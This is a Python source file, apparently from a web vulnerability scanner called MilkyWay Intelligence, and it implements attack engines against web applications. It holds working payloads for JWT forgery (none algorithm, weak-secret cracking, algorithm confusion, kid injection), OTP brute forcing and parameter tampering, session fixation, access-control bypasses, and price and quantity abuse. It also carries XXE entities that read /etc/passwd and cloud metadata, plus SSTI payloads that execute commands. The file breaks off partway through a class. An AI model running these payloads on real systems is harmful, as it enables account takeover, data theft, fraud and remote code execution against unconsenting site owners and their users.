"""
remaining_engines.py — All Remaining Attack Engines
E09-E35 Full Implementations
MilkyWay Intelligence | Author: Sharlix
"""
import asyncio
import base64
import hashlib
import hmac
import json
import re
import subprocess
from typing import Dict, List, Optional
from protocols.http_client import HTTPClient


# ══════════════════════════════════════════════════════════
# E09 — JWT Engine (standalone)
# ══════════════════════════════════════════════════════════
class JWTEngine:
    WEAK_SECRETS = [
        "secret","password","123456","jwt_secret","mysecret","test",
        "key","private","secretkey","changeme","supersecret","qwerty",
        "letmein","admin","pass","12345678","token","app_secret",
        "secret_key","jwt","your-secret","change_me","weak","simple",
    ]

    def __init__(self, db, logger, http: HTTPClient, sm):
        self.db = db; self.log = logger; self.http = http; self.sm = sm
        self.findings = []

    async def run(self, target_url: str = None) -> List[Dict]:
        self.findings = []
        sessions = self.db.get_all_sessions()
        for s in sessions:
            token = s.get("token", "")
            if token and token.startswith("eyJ"):
                self.log.info(f"JWT: testing token for role={s['role']}")
                await self._test_none_alg(token)
                await self._test_weak_secret(token)
                await self._test_alg_confusion(token)
                await self._test_kid_injection(token)
                await self._test_role_tamper(token)
        return self.findings

    async def _test_none_alg(self, token: str):
        try:
            parts   = token.split(".")
            if len(parts) != 3:
                return
            header  = json.loads(self._b64d(parts[0]))
            payload = json.loads(self._b64d(parts[1]))
            header["alg"] = "none"
            for k in ("role","roles","is_admin","admin","type","group"):
                if k in payload:
                    payload[k] = "admin"
            forged = f"{self._b64e(header)}.{self._b64e(payload)}."
            for ntype in ("ADMIN", "PROFILE"):
                for node in self.db.get_nodes_by_type(ntype)[:3]:
                    r = await self.http.get(
                        node["url"],
                        extra_headers={"Authorization": f"Bearer {forged}"}
                    )
                    if r and r.status_code == 200 and len(r.content) > 100:
                        fid = self.db.add_finding(
                            type="JWT_NONE_ALG", severity="CRITICAL",
                            endpoint=node["url"], param="Authorization",
                            method="GET",
                            description="JWT none algorithm accepted by server",
                            proof_request=f"GET {node['url']} alg=none",
                            proof_response=r.text[:400], confidence=92
                        )
                        self.findings.append({"id": fid, "type": "JWT_NONE_ALG"})
                        self.log.finding("CRITICAL","JWT NONE ALG", node["url"])
                        return
        except Exception:
            pass

    async def _test_weak_secret(self, token: str):
        try:
            parts      = token.split(".")
            hp         = f"{parts[0]}.{parts[1]}"
            sig_padded = parts[2] + "=" * (4 - len(parts[2]) % 4)
            signature  = base64.urlsafe_b64decode(sig_padded)
            for secret in self.WEAK_SECRETS:
                expected = hmac.new(
                    secret.encode(), hp.encode(), hashlib.sha256
                ).digest()
                if hmac.compare_digest(expected, signature):
                    fid = self.db.add_finding(
                        type="JWT_WEAK_SECRET", severity="CRITICAL",
                        endpoint="JWT", param="signature", method="N/A",
                        description=f"JWT weak secret cracked: '{secret}'",
                        proof_request=f"HMAC-SHA256 bruteforce → secret='{secret}'",
                        proof_response="Token is now forgeable with any claims",
                        confidence=97
                    )
                    self.findings.append({"id": fid, "type": "JWT_WEAK_SECRET"})
                    self.log.finding("CRITICAL","JWT WEAK SECRET","Token",
                                     f"secret='{secret}'")
                    return
        except Exception:
            pass

    async def _test_alg_confusion(self, token: str):
        """RS256 → HS256 algorithm confusion using public key as secret."""
        try:
            parts   = token.split(".")
            header  = json.loads(self._b64d(parts[0]))
            if header.get("alg") != "RS256":
                return
            # Try with empty string / common strings as public key
            for fake_key in ["public_key", "-----BEGIN PUBLIC KEY-----"]:
                payload = json.loads(self._b64d(parts[1]))
                payload["role"] = "admin"
                new_header = {**header, "alg": "HS256"}
                hp = f"{self._b64e(new_header)}.{self._b64e(payload)}"
                sig = base64.urlsafe_b64encode(
                    hmac.new(fake_key.encode(), hp.encode(),
                              hashlib.sha256).digest()
                ).rstrip(b"=").decode()
                forged = f"{hp}.{sig}"
                for node in self.db.get_nodes_by_type("ADMIN")[:2]:
                    r = await self.http.get(
                        node["url"],
                        extra_headers={"Authorization": f"Bearer {forged}"}
                    )
                    if r and r.status_code == 200 and len(r.content) > 50:
                        fid = self.db.add_finding(
                            type="JWT_ALG_CONFUSION", severity="CRITICAL",
                            endpoint=node["url"], param="Authorization",
                            method="GET",
                            description="JWT RS256→HS256 algorithm confusion",
                            proof_request=f"GET {node['url']} alg=HS256 forged",
                            proof_response=r.text[:400], confidence=88
                        )
                        self.findings.append({"id": fid, "type": "JWT_ALG_CONFUSION"})
                        self.log.finding("CRITICAL","JWT ALG CONFUSION", node["url"])
                        return
        except Exception:
            pass

    async def _test_kid_injection(self, token: str):
        """kid header injection — SQL/path traversal."""
        try:
            parts   = token.split(".")
            header  = json.loads(self._b64d(parts[0]))
            payload = json.loads(self._b64d(parts[1]))
            if "kid" not in header:
                return
            for injection in ["' OR '1'='1", "../../dev/null", "/dev/null"]:
                new_h = {**header, "kid": injection, "alg": "HS256"}
                hp    = f"{self._b64e(new_h)}.{self._b64e(payload)}"
                sig   = base64.urlsafe_b64encode(
                    hmac.new(b"", hp.encode(), hashlib.sha256).digest()
                ).rstrip(b"=").decode()
                forged = f"{hp}.{sig}"
                for node in self.db.get_nodes_by_type("ADMIN")[:2]:
                    r = await self.http.get(
                        node["url"],
                        extra_headers={"Authorization": f"Bearer {forged}"}
                    )
                    if r and r.status_code == 200:
                        fid = self.db.add_finding(
                            type="JWT_KID_INJECTION", severity="CRITICAL",
                            endpoint=node["url"], param="kid", method="GET",
                            description=f"JWT kid header injection: {injection}",
                            proof_request=f"kid={injection}",
                            proof_response=r.text[:400], confidence=85
                        )
                        self.findings.append({"id": fid, "type": "JWT_KID_INJECTION"})
                        self.log.finding("CRITICAL","JWT KID INJECTION", node["url"])
                        return
        except Exception:
            pass

    async def _test_role_tamper(self, token: str):
        """Simply change role claim without breaking signature (server misconfiguration)."""
        try:
            parts   = token.split(".")
            header  = json.loads(self._b64d(parts[0]))
            payload = json.loads(self._b64d(parts[1]))
            if not any(k in payload for k in
                       ("role","roles","is_admin","admin","scope","group")):
                return
            for k in ("role","roles","is_admin","admin"):
                if k in payload:
                    payload[k] = "admin"
            # Keep original signature (tests if sig is verified at all)
            tampered = f"{self._b64e(header)}.{self._b64e(payload)}.{parts[2]}"
            for node in self.db.get_nodes_by_type("ADMIN")[:2]:
                r = await self.http.get(
                    node["url"],
                    extra_headers={"Authorization": f"Bearer {tampered}"}
                )
                if r and r.status_code == 200 and len(r.content) > 100:
                    fid = self.db.add_finding(
                        type="JWT_CLAIM_TAMPER", severity="CRITICAL",
                        endpoint=node["url"], param="role claim", method="GET",
                        description="JWT role claim tampered — server doesn't verify signature",
                        proof_request=f"role=admin in payload, original sig",
                        proof_response=r.text[:400], confidence=90
                    )
                    self.findings.append({"id": fid, "type": "JWT_CLAIM_TAMPER"})
                    self.log.finding("CRITICAL","JWT CLAIM TAMPER", node["url"])
                    return
        except Exception:
            pass

    @staticmethod
    def _b64d(s: str) -> bytes:
        s += "=" * (4 - len(s) % 4)
        return base64.urlsafe_b64decode(s)

    @staticmethod
    def _b64e(d: dict) -> str:
        return base64.urlsafe_b64encode(
            json.dumps(d, separators=(",", ":")).encode()
        ).rstrip(b"=").decode()


# ══════════════════════════════════════════════════════════
# E10 — OTP Engine (standalone)
# ══════════════════════════════════════════════════════════
class OTPEngine:
    def __init__(self, db, logger, http: HTTPClient, sm):
        self.db = db; self.log = logger; self.http = http; self.sm = sm
        self.findings = []

    async def run(self, target_url: str = None) -> List[Dict]:
        self.findings = []
        nodes = ([{"url": target_url}] if target_url
                 else [n for n in self.db.get_nodes_by_type("AUTH")
                       if any(x in n["url"].lower()
                              for x in ["otp","verify","code","2fa","mfa"])])
        for node in nodes[:5]:
            url = node["url"]
            await self._test_rate_limit(url)
            await self._test_otp_reuse(url)
            await self._test_response_manipulation(url)
            await self._test_param_tamper(url)
        return self.findings

    async def _test_rate_limit(self, url: str):
        blocked = False
        for i in range(30):
            otp = str(i).zfill(6)
            resp = await self.http.post(
                url, json_data={"otp": otp, "code": otp, "token": otp}
            )
            if resp and (resp.status_code == 429
                         or "too many" in (resp.text or "").lower()
                         or "rate" in (resp.text or "").lower()):
                blocked = True
                break
        if not blocked:
            fid = self.db.add_finding(
                type="OTP_NO_RATELIMIT", severity="HIGH",
                endpoint=url, param="otp", method="POST",
                description="OTP endpoint: no rate limiting — brute force possible",
                proof_request=f"POST {url} x30 — no 429",
                proof_response="All requests succeeded", confidence=87
            )
            self.findings.append({"id": fid, "type": "OTP_NO_RATELIMIT"})
            self.log.finding("HIGH","OTP NO RATE LIMIT", url)

    async def _test_otp_reuse(self, url: str):
        """Test if OTP can be reused multiple times."""
        otp  = "123456"
        resp1 = await self.http.post(url, json_data={"otp": otp})
        if not resp1 or resp1.status_code not in (200, 400):
            return
        resp2 = await self.http.post(url, json_data={"otp": otp})
        if resp2 and resp2.status_code == 200:
            fid = self.db.add_finding(
                type="OTP_REUSE", severity="HIGH",
                endpoint=url, param="otp", method="POST",
                description="OTP accepted multiple times — reuse not prevented",
                proof_request=f"POST {url} otp={otp} x2",
                proof_response=resp2.text[:300], confidence=80
            )
            self.findings.append({"id": fid, "type": "OTP_REUSE"})
            self.log.finding("HIGH","OTP REUSE", url)

    async def _test_response_manipulation(self, url: str):
        """Check if OTP verify response can be manipulated."""
        resp = await self.http.post(
            url, json_data={"otp": "000000"}
        )
        if not resp:
            return
        try:
            body = resp.json()
            # If response has success:false, note for manual testing
            if str(body).lower() in ("false", "0", "fail", "invalid"):
                self.db.add_finding(
                    type="OTP_RESPONSE_CHECK", severity="LOW",
                    endpoint=url, param="otp", method="POST",
                    description="OTP response manipulation — test manually with proxy",
                    proof_request=f"POST {url} otp=000000",
                    proof_response=resp.text[:300], confidence=40
                )
        except Exception:
            pass

    async def _test_param_tamper(self, url: str):
        """Change email/phone param during OTP verification."""
        payloads = [
            {"otp": "123456", "email": "attacker@evil.com"},
            {"otp": "123456", "phone": "+10000000000"},
            {"otp": "123456", "user_id": "1"},
        ]
        for p in payloads:
            resp = await self.http.post(url, json_data=p)
            if resp and resp.status_code == 200:
                try:
                    body = resp.json()
                    if any(k in str(body).lower()
                           for k in ["token","success","verified"]):
                        fid = self.db.add_finding(
                            type="OTP_PARAM_TAMPER", severity="CRITICAL",
                            endpoint=url, param=list(p.keys())[1],
                            method="POST",
                            description="OTP param tampering — victim param replaced with attacker",
                            proof_request=f"POST {url} {p}",
                            proof_response=resp.text[:300], confidence=82
                        )
                        self.findings.append({"id": fid, "type": "OTP_PARAM_TAMPER"})
                        self.log.finding("CRITICAL","OTP PARAM TAMPER", url)
                        return
                except Exception:
                    pass


# ══════════════════════════════════════════════════════════
# E11 — Session Engine
# ══════════════════════════════════════════════════════════
class SessionEngine:
    def __init__(self, db, logger, http: HTTPClient, sm):
        self.db = db; self.log = logger; self.http = http; self.sm = sm
        self.findings = []

    async def run(self, target_url: str = None) -> List[Dict]:
        self.findings = []
        login_nodes = self.db.get_nodes_by_type("AUTH")
        for node in login_nodes[:3]:
            url = node["url"]
            if "login" in url.lower() or "signin" in url.lower():
                await self._test_fixation(url)
                await self._test_after_logout(url)
                await self._test_prediction(url)
        return self.findings

    async def _test_fixation(self, login_url: str):
        """Set session ID before login — check if kept after login."""
        fixed_sid = "FIXED_SESSION_12345"
        r1 = await self.http.post(
            login_url,
            json_data={"username": "test", "password": "test"},
            extra_headers={"Cookie": f"sessionid={fixed_sid}"}
        )
        if not r1:
            return
        # Check if same session ID is in response
        cookies_str = str(r1.cookies) + r1.text[:500]
        if fixed_sid in cookies_str:
            fid = self.db.add_finding(
                type="SESSION_FIXATION", severity="HIGH",
                endpoint=login_url, param="sessionid", method="POST",
                description="Session fixation: pre-login session ID preserved post-login",
                proof_request=f"POST {login_url} Cookie: sessionid={fixed_sid}",
                proof_response=r1.text[:300], confidence=80
            )
            self.findings.append({"id": fid, "type": "SESSION_FIXATION"})
            self.log.finding("HIGH","SESSION FIXATION", login_url)

    async def _test_after_logout(self, login_url: str):
        """Test if session token works after logout."""
        session = self.db.get_session("user_a")
        if not session or not session.get("token"):
            return
        logout_url = login_url.replace("login","logout").replace("signin","signout")
        await self.http.post(logout_url,
                              extra_headers=self.sm.get_headers_for_role("user_a"))
        # Re-use old token
        for node in self.db.get_nodes_by_type("PROFILE")[:2]:
            r = await self.http.get(
                node["url"],
                extra_headers={"Authorization": f"Bearer {session['token']}"}
            )
            if r and r.status_code == 200 and len(r.content) > 100:
                fid = self.db.add_finding(
                    type="SESSION_AFTER_LOGOUT", severity="HIGH",
                    endpoint=node["url"], param="token", method="GET",
                    description="Session token still valid after logout",
                    proof_request=f"GET {node['url']} with post-logout token",
                    proof_response=r.text[:300], confidence=85
                )
                self.findings.append({"id": fid, "type": "SESSION_AFTER_LOGOUT"})
                self.log.finding("HIGH","SESSION AFTER LOGOUT", node["url"])
                return

    async def _test_prediction(self, login_url: str):
        """Check session token randomness."""
        tokens = []
        for _ in range(5):
            r = await self.http.post(
                login_url,
                json_data={"username": f"guest{_}", "password": "guest"}
            )
            if r:
                for ck, cv in r.cookies.items():
                    if "session" in ck.lower():
                        tokens.append(cv)
        if len(tokens) >= 3:
            # Check if tokens have very similar length (potential pattern)
            lengths = [len(t) for t in tokens]
            if max(lengths) - min(lengths) < 2 and len(set(tokens[:3])) == 1:
                fid = self.db.add_finding(
                    type="SESSION_PREDICTABLE", severity="CRITICAL",
                    endpoint=login_url, param="sessionid", method="POST",
                    description="Session tokens appear predictable / identical",
                    proof_request=f"Multiple logins → same token",
                    proof_response=str(tokens), confidence=85
                )
                self.findings.append({"id": fid, "type": "SESSION_PREDICTABLE"})
                self.log.finding("CRITICAL","SESSION PREDICTABLE", login_url)


# ══════════════════════════════════════════════════════════
# E14 — BAC (Broken Access Control) Engine — standalone
# ══════════════════════════════════════════════════════════
class BACEngine:
    HTTP_VERBS = ["GET","POST","PUT","DELETE","PATCH",
                  "HEAD","OPTIONS","TRACE","CONNECT"]
    PATH_VARIATIONS = [
        "", "/", "//", "/.", "/..",
        "/%2e/", "/%2f",
        ".json", ".xml", ".php", ".asp",
    ]

    def __init__(self, db, logger, http: HTTPClient, sm):
        self.db = db; self.log = logger; self.http = http; self.sm = sm
        self.findings = []

    async def run(self, target_url: str = None) -> List[Dict]:
        self.findings = []
        nodes = ([{"url": target_url}] if target_url
                 else self.db.get_nodes_by_type("ADMIN")
                    + self.db.get_nodes_by_type("PAYMENT"))
        for node in nodes[:15]:
            url = node["url"]
            await self._test_unauthenticated(url)
            await self._test_path_variations(url)
            await self._test_method_override(url)
        return self.findings

    async def _test_unauthenticated(self, url: str):
        resp = await self.http.get(url)
        if resp and resp.status_code == 200 and len(resp.content) > 100:
            fid = self.db.add_finding(
                type="BAC_UNAUTH", severity="CRITICAL",
                endpoint=url, param="Authorization", method="GET",
                description="Sensitive endpoint accessible without authentication",
                proof_request=f"GET {url} — no auth headers",
                proof_response=resp.text[:400], confidence=90
            )
            self.findings.append({"id": fid, "type": "BAC_UNAUTH"})
            self.log.finding("CRITICAL","BAC — UNAUTH ACCESS", url)

    async def _test_path_variations(self, url: str):
        for variation in self.PATH_VARIATIONS:
            test_url = url + variation
            resp = await self.http.get(test_url)
            if resp and resp.status_code == 200 and len(resp.content) > 100:
                fid = self.db.add_finding(
                    type="BAC_PATH_BYPASS", severity="HIGH",
                    endpoint=url, param="path", method="GET",
                    description=f"Access control bypass via path variation: '{variation}'",
                    proof_request=f"GET {test_url}",
                    proof_response=resp.text[:300], confidence=75
                )
                self.findings.append({"id": fid, "type": "BAC_PATH_BYPASS"})
                self.log.finding("HIGH","BAC PATH BYPASS", test_url)
                return

    async def _test_method_override(self, url: str):
        override_headers = [
            {"X-HTTP-Method-Override": "GET"},
            {"X-HTTP-Method": "GET"},
            {"_method": "GET"},
        ]
        for hdrs in override_headers:
            resp = await self.http.post(url, extra_headers=hdrs)
            if resp and resp.status_code == 200 and len(resp.content) > 100:
                fid = self.db.add_finding(
                    type="HTTP_METHOD_OVERRIDE", severity="MEDIUM",
                    endpoint=url, param=list(hdrs.keys())[0], method="POST",
                    description="HTTP method override accepted",
                    proof_request=f"POST {url} {hdrs}",
                    proof_response=resp.text[:300], confidence=70
                )
                self.findings.append({"id": fid, "type": "HTTP_METHOD_OVERRIDE"})
                self.log.finding("MEDIUM","HTTP METHOD OVERRIDE", url)
                return


# ══════════════════════════════════════════════════════════
# E16 — Business Logic Engine (proper)
# ══════════════════════════════════════════════════════════
class BusinessLogicEngine:
    def __init__(self, db, logger, http: HTTPClient, sm):
        self.db = db; self.log = logger; self.http = http; self.sm = sm
        self.findings = []

    async def run(self, target_url: str = None) -> List[Dict]:
        self.findings = []
        hdrs = self.sm.get_headers_for_role("user_a")
        cks  = self.sm.get_cookies_for_role("user_a")
        nodes = ([{"url": target_url}] if target_url
                 else self.db.get_nodes_by_type("PAYMENT")
                    + self.db.get_nodes_by_type("PROFILE"))

        for node in nodes[:10]:
            url = node["url"]
            await self._test_negative_qty(url, hdrs, cks)
            await self._test_zero_price(url, hdrs, cks)
            await self._test_coupon_stack(url, hdrs, cks)
            await self._test_self_transfer(url, hdrs, cks)
        return self.findings

    async def _test_negative_qty(self, url, hdrs, cks):
        for qty in [-1, -100, 0, 999999]:
            resp = await self.http.post(
                url, json_data={"quantity": qty, "qty": qty, "amount": qty},
                extra_headers=hdrs, session_cookies=cks
            )
            if resp and resp.status_code in (200, 201):
                try:
                    body = resp.json()
                    if any(k in str(body).lower()
                           for k in ["order","success","credit","balance"]):
                        fid = self.db.add_finding(
                            type="NEGATIVE_QUANTITY", severity="HIGH",
                            endpoint=url, param="quantity", method="POST",
                            description=f"Negative/invalid quantity accepted: qty={qty}",
                            proof_request=f"POST {url} quantity={qty}",
                            proof_response=resp.text[:300], confidence=78
                        )
                        self.findings.append({"id": fid, "type": "NEGATIVE_QUANTITY"})
                        self.log.finding("HIGH","NEGATIVE QUANTITY", url, f"qty={qty}")
                        return
                except Exception:
                    pass

    async def _test_zero_price(self, url, hdrs, cks):
        for p in ["price","cost","total","amount","fee"]:
            resp = await self.http.post(
                url, json_data={p: 0},
                extra_headers=hdrs, session_cookies=cks
            )
            if resp and resp.status_code in (200, 201):
                try:
                    body = resp.json()
                    if "success" in str(body).lower() or "order" in str(body).lower():
                        fid = self.db.add_finding(
                            type="ZERO_PRICE", severity="CRITICAL",
                            endpoint=url, param=p, method="POST",
                            description=f"Zero price accepted for purchase via '{p}'",
                            proof_request=f"POST {url} {p}=0",
                            proof_response=resp.text[:300], confidence=85
                        )
                        self.findings.append({"id": fid, "type": "ZERO_PRICE"})
                        self.log.finding("CRITICAL","ZERO PRICE BYPASS", url, f"{p}=0")
                        return
                except Exception:
                    pass

    async def _test_coupon_stack(self, url, hdrs, cks):
        for c in [["CODE10","CODE10"], ["SAVE20","SAVE20","SAVE20"]]:
            resp = await self.http.post(
                url, json_data={"coupons": c, "coupon": c[0]},
                extra_headers=hdrs, session_cookies=cks
            )
            if resp and resp.status_code in (200,201):
                try:
                    body = resp.json()
                    if "discount" in str(body).lower():
                        fid = self.db.add_finding(
                            type="COUPON_STACKING", severity="HIGH",
                            endpoint=url, param="coupon", method="POST",
                            description="Multiple coupon codes accepted simultaneously",
                            proof_request=f"POST {url} coupons={c}",
                            proof_response=resp.text[:300], confidence=72
                        )
                        self.findings.append({"id": fid, "type": "COUPON_STACKING"})
                        self.log.finding("HIGH","COUPON STACKING", url)
                        return
                except Exception:
                    pass

    async def _test_self_transfer(self, url, hdrs, cks):
        uid = self.sm.get_user_id("user_a")
        if not uid:
            return
        resp = await self.http.post(
            url, json_data={"from": uid, "to": uid, "amount": 1000},
            extra_headers=hdrs, session_cookies=cks
        )
        if resp and resp.status_code in (200, 201):
            try:
                body = resp.json()
                if "balance" in str(body).lower() or "transfer" in str(body).lower():
                    fid = self.db.add_finding(
                        type="SELF_TRANSFER", severity="HIGH",
                        endpoint=url, param="from/to", method="POST",
                        description="Self-transfer allowed — potential balance inflation",
                        proof_request=f"POST {url} from={uid} to={uid} amount=1000",
                        proof_response=resp.text[:300], confidence=75
                    )
                    self.findings.append({"id": fid, "type": "SELF_TRANSFER"})
                    self.log.finding("HIGH","SELF TRANSFER", url)
            except Exception:
                pass


# ══════════════════════════════════════════════════════════
# E18 — Workflow Engine
# ══════════════════════════════════════════════════════════
class WorkflowEngine:
    def __init__(self, db, logger, http: HTTPClient, sm):
        self.db = db; self.log = logger; self.http = http; self.sm = sm
        self.findings = []

    async def run(self, target_url: str = None) -> List[Dict]:
        self.findings = []
        hdrs = self.sm.get_headers_for_role("user_a")
        cks  = self.sm.get_cookies_for_role("user_a")

        # Find multi-step flows (step1, step2, etc.)
        all_nodes = self.db.get_all_nodes()
        flows     = self._detect_flows(all_nodes)

        for flow_name, steps in flows.items():
            if len(steps) >= 2:
                await self._test_step_skip(steps, hdrs, cks, flow_name)
        return self.findings

    def _detect_flows(self, nodes):
        """Group URLs by common prefix + step patterns."""
        flows = {}
        patterns = [
            (r"step[_-]?(\d+)", "step"),
            (r"/(\d+)$",        "numbered"),
            (r"stage[_-]?(\d+)","stage"),
        ]
        for node in nodes:
            url = node["url"]
            for pat, name in patterns:
                m = re.search(pat, url, re.IGNORECASE)
                if m:
                    base = url[:m.start()]
                    key  = f"{name}:{base}"
                    if key not in flows:
                        flows[key] = []
                    flows[key].append({"url": url, "step": int(m.group(1))})
        # Sort by step number
        for k in flows:
            flows[k].sort(key=lambda x: x["step"])
        return {k: v for k, v in flows.items() if len(v) >= 2}

    async def _test_step_skip(self, steps, hdrs, cks, flow_name):
        """Try to access last step directly without completing earlier steps."""
        last_step = steps[-1]["url"]
        resp = await self.http.get(
            last_step, extra_headers=hdrs, session_cookies=cks
        )
        if resp and resp.status_code == 200 and len(resp.content) > 50:
            fid = self.db.add_finding(
                type="WORKFLOW_BYPASS", severity="HIGH",
                endpoint=last_step, param="flow_step", method="GET",
                description=f"Workflow step skip: reached final step without completing prior steps",
                proof_request=f"GET {last_step} directly",
                proof_response=resp.text[:300], confidence=72
            )
            self.findings.append({"id": fid, "type": "WORKFLOW_BYPASS"})
            self.log.finding("HIGH","WORKFLOW BYPASS", last_step,
                             f"flow={flow_name}")


# ══════════════════════════════════════════════════════════
# E23 — XXE Engine
# ══════════════════════════════════════════════════════════
class XXEEngine:
    XXE_PAYLOADS = [
        # Classic XXE
        """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>""",
        # SSRF via XXE
        """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>&xxe;</root>""",
        # Blind XXE via error
        """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent">]>
<root>&xxe;</root>""",
    ]
    SVG_XXE = """<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg width="500px" height="100px" xmlns="http://www.w3.org/2000/svg">
<text font-size="15">&xxe;</text></svg>"""

    def __init__(self, db, logger, http: HTTPClient, sm):
        self.db = db; self.log = logger; self.http = http; self.sm = sm
        self.findings = []

    async def run(self, target_url: str = None) -> List[Dict]:
        self.findings = []
        hdrs = self.sm.get_headers_for_role("user_a")
        cks  = self.sm.get_cookies_for_role("user_a")
        nodes = ([{"url": target_url}] if target_url
                 else self.db.get_all_nodes())

        for node in nodes[:30]:
            url = node["url"]
            # Test XML-accepting endpoints
            for payload in self.XXE_PAYLOADS[:2]:
                resp = await self.http.post(
                    url, data=payload,
                    extra_headers={
                        **hdrs,
                        "Content-Type": "application/xml"
                    },
                    session_cookies=cks
                )
                if resp and ("root:" in resp.text or "daemon:" in resp.text
                             or "ami-id" in resp.text):
                    fid = self.db.add_finding(
                        type="XXE", severity="CRITICAL",
                        endpoint=url, param="xml_body", method="POST",
                        description="XXE injection — file read via XML entity",
                        proof_request=f"POST {url} XML with SYSTEM entity",
                        proof_response=resp.text[:400], confidence=93
                    )
                    self.findings.append({"id": fid, "type": "XXE"})
                    self.log.finding("CRITICAL","XXE INJECTION", url)
                    break

            # Test file upload endpoints with SVG XXE
            if any(x in url.lower() for x in ["upload","file","image","media"]):
                resp = await self.http.post(
                    url,
                    data={"file": ("evil.svg", self.SVG_XXE, "image/svg+xml")},
                    extra_headers=hdrs, session_cookies=cks
                )
                if resp and resp.status_code in (200, 201):
                    if "root:" in resp.text or "passwd" in resp.text:
                        fid = self.db.add_finding(
                            type="XXE_SVG", severity="CRITICAL",
                            endpoint=url, param="file_upload", method="POST",
                            description="XXE via SVG file upload",
                            proof_request=f"POST {url} SVG with SYSTEM entity",
                            proof_response=resp.text[:400], confidence=90
                        )
                        self.findings.append({"id": fid, "type": "XXE_SVG"})
                        self.log.finding("CRITICAL","XXE VIA SVG", url)
        return self.findings


# ══════════════════════════════════════════════════════════
# E24 — SSTI Engine (standalone)
# ══════════════════════════════════════════════════════════
class SSTIEngine:
    PROBES = [
        ("{{7*7}}",    "49",  "Jinja2/Twig"),
        ("${7*7}",     "49",  "FreeMarker/EL"),
        ("#{7*7}",     "49",  "Thymeleaf/Ruby"),
        ("{7*7}",      "49",  "Smarty"),
        ("<%=7*7%>",   "49",  "ERB/EJS"),
        ("{{7*'7'}}",  "7777777", "Jinja2"),
    ]
    RCE_PAYLOADS = {
        "Jinja2": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "Twig":   "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "FreeMarker": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
    }

    def __init__(self, db, logger, http: HTTPClient, sm):
        self.db = db; self.log = logger; self.http = http; self.sm = sm
        self.findings = []

    async def run(self, target_url: str = None) -> List[Dict]:
        self.findings = []
        hdrs  = self.sm.get_headers_for_role("user_a")
        cks   = self.sm.get_cookies_for_role("user_a")
        nodes = ([{"url": target_url, "params": "[]"}] if target_url
                 else self.db.get_all_nodes())

        for node in nodes[:30]:
            url    = node["url"]
            params = self._parse_params(node.get("params","[]"))
            for param in params[:5]:
                for payload, expected, engine in self.PROBES:
                    resp = await self.http.get(
                        url, params={param: payload},
                        extra_headers=hdrs, session_cookies=cks
                    )
                    if resp and expected in resp.text:
                        self.log.finding("CRITICAL","SSTI DETECTED", url,
                                         f"engine={engine} param={param}")
                        # Try RCE escalation
                        rce = await self._escalate_rce(
                            url, param, engine, hdrs, cks
                        )
                        severity = "CRITICAL"
                        desc = (f"SSTI ({engine}) → RCE confirmed via 'id'"
                                if rce else
                                f"SSTI ({engine}) via {param}: {payload}={expected}")
                        fid = self.db.add_finding(
                            type="SSTI" + ("_RCE" if rce else ""),
                            severity=severity,
                            endpoint=url, param=param, method="GET",
                            description=desc,
                            proof_request=f"GET {url}?{param}={payload}",
                            proof_response=resp.text[:400], confidence=95
                        )
                        self.findings.append({"id": fid, "type": "SSTI"})
                        break
        return self.findings

    async def _escalate_rce(self, url, param, engine, hdrs, cks) -> bool:
        payload = self.RCE_PAYLOADS.get(engine, "")
        if not payload:
            return False
        resp = await self.http.get(
            url, params={param: payload},
            extra_headers=hdrs, session_cookies=cks
        )
        if resp and re.search(r"uid=\d+\(", resp.text):
            self.log.finding("CRITICAL","SSTI → RCE (id command executed!)", url)
            return True
        return False

    @staticmethod
    def _parse_params(s) -> list:
        if isinstance(s, list):
            return s
        try:
            return json.loads(s)
        except Exception:
            return []


# ══════════════════════════════════════════════════════════
# E26 — WebSocket Engine
# ══════════════════════════════════════════════════════════
class WebSocketEngine:
    def __init__(self, db, logger, http: HTTPClient, sm):
        self.db = db; self.log = logger; self.http = http; self.sm = sm
        self.findings = []

    async def run(self, target_url: str = None) -> List[Dict]:
        self.findings = []
        nodes = ([{"url": target_url}] if target_url
                 else self.db.get_nodes_by_type("WEBSOCKET"))
        if not nodes:
            return []

        for node in nodes[:5]:
            url = node["url"]
            await self._test_ws(url)
        return self.findings

    async def _test_ws(self, url: str):
        try:
            import websockets
            # Convert http → ws
            ws_url = url.replace("https://","wss://").replace("http://","ws://")
            token  = self.sm.get_headers_for_role("user_a").get("Authorization","")

            async with websockets.connect(
                ws_url,
                extra_headers={"Authorization": token},
                ssl=None,
                open_timeout=10
            ) as ws:
                # Test unauthenticated access
                await ws.send('{"type":"ping"}')
                msg = await asyncio.wait_for(ws.recv(), timeout=5)
                if msg:
                    self.log.info(f"WebSocket connected: {ws_url} → {str(msg)[:80]}")

                # Test injection
                await ws.send('{"type":"message","data":"<script>alert(1)</script>"}')
                msg2 = await asyncio.wait_for(ws.recv(), timeout=5)
                if msg2 and "<script>" in str(msg2):
                    fid = self.db.add_finding(
                        type="WEBSOCKET_XSS", severity="HIGH",
                        endpoint=ws_url, param="message", method="WS",
                        description="WebSocket XSS — payload reflected in message",
                        proof_request=f"WS {ws_url} → XSS payload",
                        proof_response=str(msg2)[:300], confidence=78
                    )
                    self.findings.append({"id": fid, "type": "WEBSOCKET_XSS"})
                    self.log.finding("HIGH","WEBSOCKET XSS", ws_url)

        except ImportError:
            self.log.warn("websockets not installed — skipping WS tests")
        except Exception as e:
            self.log.warn(f"WS test failed {url}: {str(e)[:60]}")
        return self.findings


# ══════════════════════════════════════════════════════════
# E27 — API Engine
# ══════════════════════════════════════════════════════════
class APIEngine:
    CONTENT_TYPES = [
        "application/json",
        "application/xml",
        "text/xml",
        "application/x-www-form-urlencoded",
        "multipart/form-data",
    ]

    def __init__(self, db, logger, http: HTTPClient, sm):
        self.db = db; self.log = logger; self.http = http; self.sm = sm
        self.findings = []

    async def run(self, target_url: str = None) -> List[Dict]:
        self.findings = []
        nodes = ([{"url": target_url, "method": '["GET"]'}] if target_url
                 else self.db.get_nodes_by_type("API"))
        hdrs = self.sm.get_headers_for_role("user_a")
